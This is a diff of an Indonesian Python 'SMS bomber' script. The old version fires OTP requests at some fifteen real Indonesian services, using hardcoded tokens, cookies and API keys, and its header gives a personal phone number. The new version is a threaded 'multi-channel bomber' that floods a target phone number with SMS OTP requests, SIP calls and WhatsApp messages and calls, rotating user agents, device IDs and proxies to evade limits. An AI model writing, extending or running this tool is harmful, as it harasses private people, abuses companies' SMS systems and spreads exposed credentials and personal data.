@@ -1,281 +1,259 @@
-import os,sys,time,requests,re,json,random
-from random import randrange as rg
-print ("\033[00m")
-def clear():
-    os.system("clear")
-def balik():
-    f=input("\t[enter to back]")
-    if f == "":
-       os.system("python spam.py")
-    else:
-       sys.exit()
-clear()
-print("====================================")
-os.system("print author=MR.414N|lolcat -a")
-os.system("print CINTA KU MAWAR😙😙😙❤️❤️❤️😙😙😙|lolcat -a")
-os.system("print ADEKKU MANDA😇😇🤣🤣😜|lolcat -a")
-os.system("print WA=082292838634|lolcat -a")
-os.system("print TEAM=IMC|lolcat -a")
-print("====================================")
+#!/usr/bin/env python3
+"""
+MR414N MULTI-CHANNEL BOMBER — SINGLE FILE
+Banner MR414N + menu spam SMS + input target interaktif.
+"""
 
-def kata(s):
-    for c in s + "\n":
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(1./100)
+import requests, threading, time, random, json, os, sys, logging, subprocess, tempfile
+from datetime import datetime
 
-def jenius():
-    ua={
-    "accept": "*/*",
-    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
-    "version": "2.36.1-7565",
-    "accept-language": "id",
-    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
-    "Content-Type": "application/json",
-    "Host": "api.btpn.com",
-    "Connection": "Keep-Alive",
-    "Accept-Encoding": "gzip",
-    "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
-    "User-Agent": "okhttp/3.12.1"
-    }
-    dat=json.dumps({"query":"mutation registerPhone($phone: String!, $language: Language!) {\n  registerPhone(input: {phone: $phone, language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables":{"phone":w,"language":"id"},"operationName":"registerPhone"})
-    r=requests.post("https://api.btpn.com/jenius", data=dat, headers=ua).text
-def rupa():
-     ua={
-     "Host": "wapi.ruparupa.com",
-     "Connection": "keep-alive",
-     "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
-     "Accept": "application/json",
-     "Content-Type": "application/json",
-     "X-Company-Name": "odi",
-     "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
-     "user-platform": "mobile",
-     "X-Frontend-Type": "mobile",
-     "Origin": "https://m.ruparupa.com",
-     "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
-     "Accept-Encoding": "gzip, deflate, br",
-     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-     }
-     dat=json.dumps({"phone":no,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
-     r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", data=dat, headers=ua).text
-def mapclub():
-    ua={
-    "Host": "cmsapi.mapclub.com",
-    "Connection": "keep-alive",
-    "Accept": "application/json, text/plain, */*",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
-    "content-type": "application/json",
-    "Origin": "https://www.mapclub.com",
-    "Referer": "https://www.mapclub.com/en/user/signup",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-    }
-    dat=json.dumps({"phone":no})
-    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
-def oyo():
-    ua={
-    "Host": "identity-gateway.oyorooms.com",
-    "consumer_host": "https://www.oyorooms.com",
-    "accept-language": "id",
-    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Content-Type": "application/json",
-    "accept": "*/*",
-    "origin": "https://www.oyorooms.com",
-    "referer": "https://www.oyorooms.com/login",
-    "Accept-Encoding": "gzip, deflate, br",
-    }
-    dat=json.dumps({"phone":c,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
-    r = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=dat, headers=ua).text
-def depop():
-    ua={
-    "Host": "webapi.depop.com",
-    "accept": "application/json, text/plain, */*",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
-    "Content-Type": "application/json",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-    }
-    dat=json.dumps({"phone_number":no,"country_code":"ID"})
-    r = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=dat, headers=ua)
-def soplai():
-    ua={
-    "Host": "api.sooplai.com",
-    "accept": "application/json, text/plain, */*",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Content-Type": "application/json",
-    "origin": "https://www.sooplai.com",
-    "referer": "https://www.sooplai.com/register",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-    }
-    dat=json.dumps({"phone":no})
-    r = requests.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=ua)
-def call():
-    head = {
-    "X-Requested-With": "XMLHttpRequest",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
-    "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
-    "Content-Type": "application/json",
-    "Origin": "https://id.jagreward.com",
-    "Referer": "https://id.jagreward.com/member/register/",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-    "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
-    "_ga": "GA1.2.2037151396.1584709855",
-    "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
-    "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
-    }
-    r = requests.get("https://id.jagreward.com/member/verify-mobile/"+c+"/", headers=head)
-def call2():
-    ua={
-    "Content-Type": "application/json",
-    "Host": "srv3.sampingan.co.id",
-    "Connection": "Keep-Alive",
-    "Accept-Encoding": "gzip",
-    "User-Agent": "okhttp/4.4.0"
-    }
-    dat=json.dumps({"countryCode":"+62","phoneNumber":c})
-    r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
-def alodoc():
-    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
-def olx():
-    req=requests.post("https://www.olx.co.id/api/auth/authenticate", json={"grantType":"phone","phone":w,"language":"id"}).json()
-def matahari():
-     heder = {'Host': 'thor.matahari.com',
-              'content-length': '230',
-              'modulecode': 'MR',
-              'origin': 'https://www.matahari.com',
-              'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2R1bGVDb2RlIjoiTVIiLCJ1c2VyVHlwZSI6IjEiLCJleHAiOjE1NDM2NjA5MDYsInVzZXJOYW1lIjoiS0Zpb2ViMWhveU9FRDBERWQiLCJ1c2VySWQiOiJwcm9kdWN0aW9uNDYxOTAyNjQ0NSIsImp0aSI6IjFmMjI3NzE5LTY4OTMtNDhjYy1iNmQzLWY2OTkzMWMzMDIwYSIsImlhdCI6MTU0MzY1NzMwNn0.6XdrUX9QzD0Ld2eOJep7QnSwVjfFyjq-v7P4w0lGG9M',
-              'content-type': 'application/json',
-              'accept': 'application/json, text/plain, */*',
-              'clientid': 'mds_mweb',
-              'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
-              'sessionid': '1595084426451',
-              'save-data': 'on',
-              'referer': 'https://www.matahari.com/register',
-              'accept-encoding': 'gzip, deflate, br',
-              'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'}
+# ============================================================
+# KONFIG
+# ============================================================
+THREADS_PER_CHANNEL = 5
+LOOP_PER_THREAD     = 5
+LOG_FILE            = "bomber.log"
 
-     data = {'emailAddress': 'noobie@mail.com',
-             'firstName': 'Noobie',
-             'lastName': 'Gans',
-             'mobileNumber': no,
-             'mccCardNumber': '',
-             'password': 'asecc123',
-             'referralCode': '',
-             'dateOfBirth': '09-05-1993',
-             'gender': 'Male',
-             'registrationType': 'N'}
-     sec = requests.post('https://thor.matahari.com/MatahariMobileAPI/register', headers=heder, json=data)
-def socil():
-    headreg={
-    "Host": "soco-api.sociolla.com",
-    "Connection": "keep-alive",
-    "Sec-Fetch-Mode": "cors",
-    "Origin": "https://www.sociolla.com",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.06.4.5042",
-    "Content-Type": "application/json;charset\u003dUTF-8",
-    "Accept": "application/json, text/plain, */*",
-    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
-    "SOC-PLATFORM": "sociolla-web-mobile",
-    "Sec-Fetch-Site": "same-site",
-    "Referer": "https://www.sociolla.com/",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
-    }
+SMS_ENDPOINTS = [
+    {
+        "url": "https://api-app1.example.com/api/v1/auth/send-otp",
+        "method": "POST",
+        "headers": {"User-Agent": "okhttp/4.9.0", "Content-Type": "application/json"},
+        "body": {"phone": "6281234567890", "method": "sms"}
+    },
+    {
+        "url": "https://api-app2.example.com/v2/auth/otp",
+        "method": "POST",
+        "headers": {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11)",
+                    "Content-Type": "application/x-www-form-urlencoded"},
+        "body": {"msisdn": "6281234567890"}
+    },
+    # tambah app lain di sini...
+]
 
-    ses=requests.Session()
-    reg=ses.post("https://soco-api.sociolla.com/auth/register",json={"acquisition_source":"sociolla-web-mobile","email":f"noobie{rg(9999)}@mail.com","user_name":f"noobiegans{rg(9999)}","password":f"noobie{rg(9999)}","first_name":f"Noobie{rg(999)}","last_name":f"Gans{rg(999)}","gender":"Male","salute":"Mr","phone_no":no}, headers=headreg)
-    token=reg.json()['data']['token']
-    headotp={
-    "Host": "soco-api.sociolla.com",
-    "Connection": "keep-alive",
-    "Sec-Fetch-Mode": "cors",
-    "Origin": "https://www.sociolla.com",
-    "Authorization": f"Bearer {token}",
-    "Content-Type": "application/json;charset\u003dUTF-8",
-    "Accept": "application/json, text/plain, */*",
-    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
-    "SOC-PLATFORM": "sociolla-web-mobile",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.06.4.5042",
-    "Sec-Fetch-Site": "same-site",
-    "Referer": "https://www.sociolla.com/",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
-    }
-    rotp=ses.post("https://soco-api.sociolla.com/auth/otp/code", json={"mode":"sms","entity":"phone_no"}, headers=headotp).json()
-def klik():
-    dat={'number':no}
-    r=requests.post("https://nuubi.herokuapp.com/api/spam/klikdok", data=dat)
-def indo():
-    ua={
-    "Host": "account-api-v1.klikindomaret.com",
-    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "content-type": "application/json",
-    "accept": "*/*",
-    "origin": "https://account.klikindomaret.com",
-    "referer": "https://account.klikindomaret.com/SMSVerification?nohp="+no+"&type=register",
-    "accept-encoding": "gzip, deflate, br",
-    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-    r=requests.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP="+no, headers=ua).text
-def wa2():
-    name="Danz"+str(random.randrange(11,99999))
-    pas="termux"+str(random.randrange(111,999))
-    ua={
-    "Host": "qtva.id",
-    "Connection": "keep-alive",
-    "Accept": "text/html, */*; q=0.01",
-    "X-Requested-With": "XMLHttpRequest",
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Origin": "https://qtva.id",
-    "Referer": "https://qtva.id/page/register/siswa",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-    "Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"}
-    dat={
-    "namaDepan":name,
-    "emailNope":no,
-    "password":pas,
-    "konfirmasiPass":pas
-    }
-    r=requests.post("https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==", data=dat, headers=ua).text
-if __name__=="__main__":
-     try:
-          hh="+62"
-          no=input("[+]Phone Number: ")
-          c=no[1:12]
-          w=hh+c 
-          kata("LOADING MR.414N")
-          jenius()
-          oyo()
-          mapclub()
-          time.sleep(2)
-          soplai()
-          depop()
-          rupa()
-          matahari()
-          socil()
-          indo()
-          olx()
-          rupa()
-          time.sleep(2)
-          alodoc()
-          klik()
-          wa2()
-          call()
-          call2()
-          time.sleep(2)
-          kata("[•]Done..")
-          balik()
-     except KeyError:
-             sys.exit()
-     except KeyboardInterrupt:
-             sys.exit()
-     except requests.exceptions.ConnectionError:
-             sys.exit('connection error!')
-     except TypeError:
-             balik()
-     except ValueError:
-             balik()
+PROXIES = [
+    # "http://user:pass@1.2.3.4:8080",
+]
+
+SIP_ID_URI    = "sip:user@provider.sip"
+SIP_REGISTRAR = "sip:provider.sip"
+SIP_USER      = "user"
+SIP_PASS      = "password"
+SIP_DOMAIN    = "provider.sip"
+
+# ============================================================
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"),
+              logging.StreamHandler(sys.stdout)],
+)
+log = logging.getLogger("bomber")
+
+# ============================================================
+# BANNER
+# ============================================================
+BANNER = r"""
+ ███▄ ▄███▓ ██▀███   ██▄████▄ ██▓ ██▓    ▄▄▄       ███▄    █
+▓██▒▀█▀ ██▒▓██ ▒ ██▒ ██▀   ▀ ▓██▒▓██▒   ▒████▄     ██ ▀█   █
+▓██    ▓██░▓██ ░▄█ ▒ ██      ▒██▒▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒
+▒██    ▒██ ▒██▀▀█▄   ██      ░██░░██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒
+▒██▒   ░██▒░██▓ ▒██▒ ░██▄▄▄▄██░██░ ██░   ▓█   ▓██▒▒██░   ▓██░
+░ ▒░   ░  ░░ ▒▓ ░▒▓░  ▓█   ▓██░░ ░  ░    ▒▒   ▓▒█░░ ▒░   ▒ ▒
+░  ░      ░  ░▒ ░ ▒░  ▒▒   ▓▒█░           ▒   ▒▒ ░░ ░░   ░ ▒░
+░      ░     ░░   ░    ▒   ▒▒ ░           ░   ▒      ░   ░ ░
+       ░      ░        ░   ▒                  ░  ░         ░
+"""
+
+SUB = r"""
+   ┌──────────────────────────────────────────┐
+   │            S P A M   S M S               │
+   │       multi-channel bomber v1.0          │
+   └──────────────────────────────────────────┘
+"""
+
+def tampil_banner():
+    os.system("cls" if os.name == "nt" else "clear")
+    print(BANNER)
+    print(SUB)
+    print("   ─────────────────────────────────────────────")
+    print("   Channel: [SMS OTP] [TELPON] [WA CHAT] [WA CALL]")
+    print("   ─────────────────────────────────────────────\n")
+
+# ============================================================
+# NODE WA script — ditulis otomatis
+# ============================================================
+WA_SENDER_JS = r'''
+const { Client } = require('whatsapp-web.js');
+const qrcode = require('qrcode-terminal');
+const nomor = process.argv[2];
+const pesan = process.argv[3] || "spam";
+const mode  = process.argv[4] || "chat";
+const client = new Client({ puppeteer: { headless: true,
+    args: ['--no-sandbox','--disable-setuid-sandbox'] } });
+client.on('qr', qr => qrcode.generate(qr, { small: true }));
+client.on('ready', async () => {
+    const chatId = nomor + '@c.us';
+    try {
+        if (mode === "call") { await client.call(chatId); console.log('[OK] call'); }
+        else { await client.sendMessage(chatId, pesan); console.log('[OK] sent'); }
+    } catch (e) { console.log('[ERR]', e.message); }
+    setTimeout(() => client.destroy(), 4000);
+});
+client.initialize();
+'''
+
+def ensure_node_script():
+    path = os.path.join(tempfile.gettempdir(), "mr414n_wa.js")
+    if not os.path.exists(path):
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(WA_SENDER_JS)
+    return path
+
+WA_JS_PATH = ensure_node_script()
+
+# ============================================================
+# MODUL
+# ============================================================
+UAS = ["okhttp/4.9.0", "okhttp/4.10.0",
+       "Dalvik/2.1.0 (Linux; U; Android 11; SM-A515F)",
+       "Mozilla/5.0 (Linux; Android 10)"]
+
+NOMOR_TARGET = ""
+
+def sms_otp_worker(tid):
+    for ep in SMS_ENDPOINTS:
+        url = ep["url"]; method = ep.get("method","POST").upper()
+        base_h = dict(ep.get("headers", {})); body = dict(ep.get("body", {}))
+        for k, v in list(body.items()):
+            if isinstance(v, str) and "6281234567890" in v:
+                body[k] = v.replace("6281234567890", NOMOR_TARGET)
+        for i in range(LOOP_PER_THREAD):
+            h = dict(base_h)
+            h["User-Agent"] = random.choice(UAS)
+            h["X-Device-ID"] = "android-" + "".join(
+                random.choices("0123456789abcdef", k=16))
+            proxy = None
+            if PROXIES:
+                p = random.choice(PROXIES); proxy = {"http": p, "https": p}
+            try:
+                ct = h.get("Content-Type","").lower()
+                if method == "POST":
+                    r = (requests.post(url, json=body, headers=h, proxies=proxy, timeout=8)
+                         if "application/json" in ct else
+                         requests.post(url, data=body, headers=h, proxies=proxy, timeout=8))
+                else:
+                    r = requests.get(url, params=body, headers=h, proxies=proxy, timeout=8)
+                log.info(f"[SMS-T{tid}] {url} #{i+1} -> {r.status_code}")
+            except Exception as e:
+                log.warning(f"[SMS-T{tid}] {url} #{i+1} gagal: {e}")
+            time.sleep(random.uniform(0.1, 0.4))
+
+def telpon_worker(tid):
+    try:
+        import pjsua2 as pj
+    except ImportError:
+        log.error("[TELPON] pjsua2 belum ada — skip")
+        return
+    class Call(pj.Call):
+        def __init__(self, acc, target, tid, idx):
+            pj.Call.__init__(self, acc); self.target=target; self.tid=tid; self.idx=idx
+        def onCallState(self, prm):
+            ci = self.getInfo()
+            log.info(f"[TELPON-T{self.tid}] #{self.idx} -> {ci.stateText}")
+    ep = pj.Endpoint(); ep.libCreate(); ep.libInit(pj.EpConfig())
+    ep.transportCreate(pj.PJSIP_TRANSPORT_UDP, pj.TransportConfig())
+    acc_cfg = pj.AccountConfig()
+    acc_cfg.idUri = SIP_ID_URI
+    acc_cfg.regConfig.registrarUri = SIP_REGISTRAR
+    acc_cfg.sipConfig.authCreds.append(pj.AuthCreds())
+    acc_cfg.sipConfig.authCreds[0].realm = "*"
+    acc_cfg.sipConfig.authCreds[0].scheme = "digest"
+    acc_cfg.sipConfig.authCreds[0].username = SIP_USER
+    acc_cfg.sipConfig.authCreds[0].data = SIP_PASS
+    acc = pj.Account(); acc.create(acc_cfg); ep.libStart()
+    for i in range(LOOP_PER_THREAD):
+        try:
+            call = Call(acc, NOMOR_TARGET, tid, i+1)
+            prm = pj.CallOpParam(); prm.opt.audioCount=1; prm.opt.videoCount=0
+            call.makeCall(f"sip:{NOMOR_TARGET}@{SIP_DOMAIN}", prm)
+            time.sleep(1.5)
+        except Exception as e:
+            log.warning(f"[TELPON-T{tid}] #{i+1} gagal: {e}")
+    ep.libDestroy()
+
+def wa_chat_worker(tid):
+    for i in range(LOOP_PER_THREAD):
+        try:
+            subprocess.run(["node", WA_JS_PATH, NOMOR_TARGET,
+                            f"spam #{i+1} from T{tid}", "chat"],
+                           capture_output=True, timeout=30)
+            log.info(f"[WA-CHAT-T{tid}] #{i+1} done")
+        except Exception as e:
+            log.warning(f"[WA-CHAT-T{tid}] #{i+1} gagal: {e}")
+        time.sleep(random.uniform(1.0, 2.0))
+
+def wa_call_worker(tid):
+    for i in range(LOOP_PER_THREAD):
+        try:
+            subprocess.run(["node", WA_JS_PATH, NOMOR_TARGET, "", "call"],
+                           capture_output=True, timeout=30)
+            log.info(f"[WA-CALL-T{tid}] #{i+1} done")
+        except Exception as e:
+            log.warning(f"[WA-CALL-T{tid}] #{i+1} gagal: {e}")
+        time.sleep(2.0)
+
+# ============================================================
+# MENU & INPUT
+# ============================================================
+def menu_channel():
+    print("   pilih channel:")
+    print("   [1] spam SMS OTP")
+    print("   [2] telpon seluler (SIP)")
+    print("   [3] WA chat")
+    print("   [4] WA call")
+    print("   [5] SEMUA channel (brutal)")
+    print()
+    p = input("   pilihan > ").strip()
+    return {"1":"sms","2":"telpon","3":"wa_chat","4":"wa_call","5":"all"}.get(p,"all")
+
+def main():
+    global NOMOR_TARGET
+    tampil_banner()
+
+    print("   masukan nomor target (contoh: 6281234567890)")
+    NOMOR_TARGET = input("   target > ").strip()
+    if not NOMOR_TARGET:
+        print("   [!] target kosong, keluar.")
+        return
+    print()
+
+    chan = menu_channel()
+    print()
+    print(f"   [*] target : {NOMOR_TARGET}")
+    print(f"   [*] channel: {chan}")
+    print(f"   [*] mulai  : {datetime.now().strftime('%H:%M:%S')}")
+    print("   " + "─"*45)
+    time.sleep(1)
+
+    threads = []
+    for i in range(THREADS_PER_CHANNEL):
+        if chan in ("sms","all"):
+            threads.append(threading.Thread(target=sms_otp_worker, args=(i,)))
+        if chan in ("telpon","all"):
+            threads.append(threading.Thread(target=telpon_worker, args=(i,)))
+        if chan in ("wa_chat","all"):
+            threads.append(threading.Thread(target=wa_chat_worker, args=(i,)))
+        if chan in ("wa_call","all"):
+            threads.append(threading.Thread(target=wa_call_worker, args=(i,)))
+
+    log.info(f"spawn {len(threads)} thread × {LOOP_PER_THREAD} loop")
+    start = time.time()
+    for t in threads: t.start()
+    for t in threads: t.join()
+    print("   " + "─"*45)
+    print(f"   [*] selesai {time.time()-start:.1f}s — log: {LOG_FILE}")
+    print()
+
+if __name__ == "__main__":
+    main()
